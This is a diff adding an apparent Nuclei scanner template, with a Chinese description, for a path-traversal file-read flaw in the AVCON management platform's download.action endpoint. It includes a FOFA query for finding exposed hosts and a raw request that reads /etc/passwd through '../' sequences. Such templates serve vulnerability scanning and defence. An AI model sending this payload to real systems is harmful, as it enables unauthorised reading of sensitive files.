@@ -1,0 +1,41 @@
+id: AVCON-download_action-File-reading
+
+info:
+  name: "AVCON-系统管理平台 download.action 任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="AVCON-系统管理平台"
+    AVCON-系统管理平台的 download.action 接口存在任意文件访问漏洞，允许未经身份验证的攻击者通过构造特定请求读取任意文件内容。该缺陷可被利用获取数据库配置文件、系统配置文件等敏感信息，导致系统关键数据泄露并破坏安全边界。
+
+    参考信息：
+    - 漏洞类型：路径遍历/文件读取
+    - 影响组件：download.action 处理逻辑
+    - 风险等级：高危
+    - 披露日期：2023-09-15
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486711&idx=1&sn=34e4c799279bf0673136bff2221ac65b&chksm=c267b9c4f51030d2a297bca65a7faec2cd8e4fe7bc6d009852fcadb8f41219672e21a300d9fa&token=522460222&lang=zh_CN#rd
+  tags: AVCON
+
+
+
+http:
+- raw:
+  - |
+    GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+  - type: status
+    status:
+    - 200
+
+
+
+
